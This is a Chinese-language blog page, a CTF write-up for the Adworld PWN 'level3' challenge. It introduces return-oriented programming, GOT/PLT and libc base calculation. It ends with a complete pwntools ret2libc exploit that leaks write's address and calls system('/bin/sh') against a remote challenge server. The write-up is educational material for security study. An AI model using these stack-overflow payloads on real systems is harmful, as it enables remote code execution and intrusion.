@@ -1,0 +1,652 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="嘻嘻嘻">
+  <meta name="author" content="zhouhuizhen">
+  <meta name="keywords" content="">
+  <title>初识ROP(Return-Oriented Programming)    攻防世界 PWN level3 - ZHZ</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>ZHZ</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-10-04 15:09" pubdate>
+      2020年10月4日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">初识ROP(Return-Oriented Programming)    攻防世界 PWN level3</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="初识ROP-Return-Oriented-Programming-攻防世界-PWN-level3"><a href="#初识ROP-Return-Oriented-Programming-攻防世界-PWN-level3" class="headerlink" title="初识ROP(Return-Oriented Programming)    攻防世界 PWN level3"></a>初识ROP(Return-Oriented Programming)    攻防世界 PWN level3</h1><p>libc介绍<br>libc是Linux下的ANSI C的函数库。<br>ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。比如write函数等…</p>
+<p>GOT和PLT的作用:<br>ELF文件中通常存在.GOT.PLT和.PLT这两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址。如果一个程序想调用动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。<br>ELF中所有用到的外部动态链接库函数都会有对应的PLT项目<br>PLT表还是一段代码，作用是从内存中取出一个地址然后跳转。取出的地址便是函数的真实地址<br>.GOT.PLT表的初始化是在第一次调用该函数的过程中完成的，也就是说，某个函数必须被调用过，.GOT.PLT表中才会存放函数的真实地址</p>
+<p>PIE保护:<br>让可执行程序ELF的地址进行随机化加载</p>
+<p>strings -a -t x libc_32.so.6 | grep “/bin/sh”获取偏移<br>find / -name “内容*”</p>
+<p>在linux中，&amp;和&amp;&amp;,|和||介绍如下：<br>&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;<br>&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo ‘1‘ &amp;&amp; echo ‘2’<br>| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo ‘yes’ | wc -l<br>|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo “fail”</p>
+<p>p = process(“./level3”)<br>elf = ELF(“./level3”)<br>libc = ELF(“./libc_32.so.6”)</p>
+<p>write_plt = elf.plt[‘write’]        //获取plt表中write地址<br>write_got = elf.got[‘write’]        //获取got表中write函数地址<br>main_addr = elf.symbols[‘main’]     //获取的.text中的main函数地址</p>
+<p>查看保护<br><img src="/images/16017953896144/16020731437133.jpg" alt="-w702"></p>
+<p>level3只开启了NX保护，而libc开启了Canary、NX、PIE保护<br>程序中没有现成的system函数。这就需要我们从libc中动态加载system函数。<br>初步思路：PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。<br><img src="/images/16017953896144/16020897187885.jpg" alt="-w614"><br>很明显read函数栈溢出了<br><img src="/images/16017953896144/16020897316881.jpg" alt="-w478"></p>
+<p>read函数时栈情况:<br><img src="/images/16017953896144/16020897769033.jpg" alt="-w872"><br><img src="/images/16017953896144/16020897904321.jpg" alt="-w462"></p>
+<p>攻击思路:<br>第一步:首先通过read函数的栈溢出漏洞，调用一次write函数，这样就能够在plt.got表中有真实的地址，如何获得write函数的真实地址?因为可以通过栈溢出来调用write函数，知道它在plt表中的地址，<br>write(fd, buf, length)<br><img src="/images/16017953896144/16020886808381.jpg" alt="-w214"></p>
+<p>从下面两个图不难看出offset aInput如果换成了offset write那不就可以读出write的got.plt地址了么,hhh<br><img src="/images/16017953896144/16020889940521.jpg" alt="-w559"><br><img src="/images/16017953896144/16020891030722.jpg" alt="-w651"><br>write函数栈内:<br><img src="/images/16017953896144/16020898566901.jpg" alt="-w592"><br>所以我们通过中间这个参数修改成write函数的got表地址就能读取write的got.plt表的地址了，记得第一次攻击后要回到主函数的地址，进行下一轮攻击</p>
+<p>第二步:在获取了write的got.plt表之后我们接下来计算libc的基址,虽然PIE保护会把基地址随机化，但libc_32.so.6中的函数地址是固定的偏移量，所以我们通过将write的真实地址减去write的偏移量就是基地址了</p>
+<p>第三步:计算出了libc的基地址后，其他的system和/bin/sh参数也就出来了，只需要将libc中的地址加上基地址就是了，不过/bin/sh得通过 命令strings -a -t x libc_32.so.6 | grep “/bin/sh”</p>
+<p>第四步:把计算好的system栈溢出攻击完事!</p>
+<p>这题我想了半天的重要要点:<br>1、每次栈溢出的攻击的开始，读入的时候就已经调用了会溢出的函数，而这个溢出的函数比如(read、gets等)已经压入了ebp，所以发现很多题每次开始都要覆盖ebp，而后面进行ROP的时候，调用其他函数就不需要手动覆盖ebp的操作了，因为调用的函数自己会对ebp压栈出栈，自动的!我只需要考虑返回地址填什么了!<br>2、通过覆盖栈的返回地址调用的函数是没有进行call的，所以攻击调用的函数地址后面要填上返回地址</p>
+<p>Exploit:</p>
+<div class="hljs"><pre><code class="hljs nix">from pwn <span class="hljs-built_in">import</span> *
+
+<span class="hljs-attr">r</span> = remote('<span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>', <span class="hljs-number">58311</span>)
+
+<span class="hljs-attr">elf</span> = ELF('./level3')   
+<span class="hljs-attr">libc</span> = ELF('./libc_32.so.<span class="hljs-number">6</span>')
+
+<span class="hljs-attr">write_plt</span> = elf.plt['write']    
+<span class="hljs-attr">write_got</span> = elf.got['write']
+<span class="hljs-attr">main_addr</span> = elf.symbols['main']
+
+<span class="hljs-attr">write_libc</span> = libc.symbols['write']
+<span class="hljs-attr">sys_libc</span> = libc.symbols['system']
+<span class="hljs-attr">bin_sh_libc</span> = <span class="hljs-number">0</span>x15902b          <span class="hljs-comment">#strings -a -t x libc_32.so.6 | grep "/bin/sh"找到sh的偏移</span>
+
+
+<span class="hljs-comment">#第一次攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + write在plt表中的地址 + write返回时主函数地址 + write参数1fd + 要求的的offset write的地址 + 长度4  </span>
+<span class="hljs-attr">payload1</span> = 'a'*<span class="hljs-number">0</span>x88 + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">0</span>x4)
+
+r.recv()
+r.sendline(payload1)
+<span class="hljs-attr">res</span> = r.recv()
+<span class="hljs-attr">write_addr</span> = u32(res[:<span class="hljs-number">4</span>])
+
+<span class="hljs-attr">base_libc</span> = write_addr - write_libc     <span class="hljs-comment">#计算PIE保护随机化后的基址</span>
+<span class="hljs-attr">sys_addr</span> = base_libc + sys_libc
+<span class="hljs-attr">bin_sh_addr</span> = base_libc + bin_sh_libc
+
+<span class="hljs-comment">#第二次攻击攻击栈内内容 = 覆盖字符数组 + 覆盖ebp + system调用地址 + 覆盖返回地址(随意) + "参数/bin/sh地址"</span>
+<span class="hljs-attr">payload2</span> = 'a'*<span class="hljs-number">0</span>x88 + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(sys_addr) + p32(<span class="hljs-number">0</span>xdeadbeef) + p32(bin_sh_addr)
+
+r.sendline(payload2)
+r.interactive()</code></pre></div>
+
+<p><img src="/images/16017953896144/16020880129185.jpg" alt="-w803"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/17/DNS%E4%BB%A5%E5%8F%8ADHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DNS以及DHCP服务器的搭建</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/05/%E7%BC%96%E5%86%99%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA%E7%A8%8B%E5%BA%8F/">
+                        <span class="hidden-mobile">编写主引导扇区程序</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+    <!-- APlayer 音乐播放器 -->
+    <div id="aplayer"></div>
+    <script defer src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js" ></script>
+<link  rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
+<script type="text/javascript">
+  var oldLoadAp = window.onload;
+  window.onload = function () {
+    oldLoadAp && oldLoadAp();
+
+    new APlayer({
+      container: document.getElementById('aplayer'),
+      fixed: true,
+      autoplay: 'false' === 'true',
+      loop: 'all',
+      order: 'random',
+      theme: '#b7daff',
+      preload: 'none',
+      audio: [{"name":"夏天的风","artist":"","url":"http://music.163.com/song/media/outer/url?id=1436709403.mp3","cover":"/img/cover.jpg"},{"name":"Daisy","artist":"Aimer","url":"http://music.163.com/song/media/outer/url?id=1383736734.mp3","cover":"/img/cover.jpg"}]
+    });
+  }
+</script>
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+
+    
+    <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+    <script>
+        var now = new Date(); 
+        function createtime() { 
+            var grt= new Date("07/19/2020 12:00:00");//在此处修改你的建站时间，格式：月/日/年 时:分:秒
+            now.setTime(now.getTime()+250); 
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+            document.getElementById("timeDate").innerHTML = "本站已勉强运行 "+dnum+" 天 "; 
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+        } 
+    setInterval("createtime()",250);
+    </script>
+    
+
+
+
+
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "初识ROP(Return-Oriented Programming)    攻防世界 PWN level3&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("MOV", "PUSH", "POP", "ADD", "INC", "JMP", "SUB", "LEA", "XOR", "AND", "SHL", "SHR", "CALL", "JNE", "JE", "LOOP", "IRET", "DB", "DW");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?dc428a945ed47760b6180c83d7c52150";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+   
+<!--动态线条背景-->
+<script type="text/javascript"
+color="140,140,140" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<!--爆炸效果-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
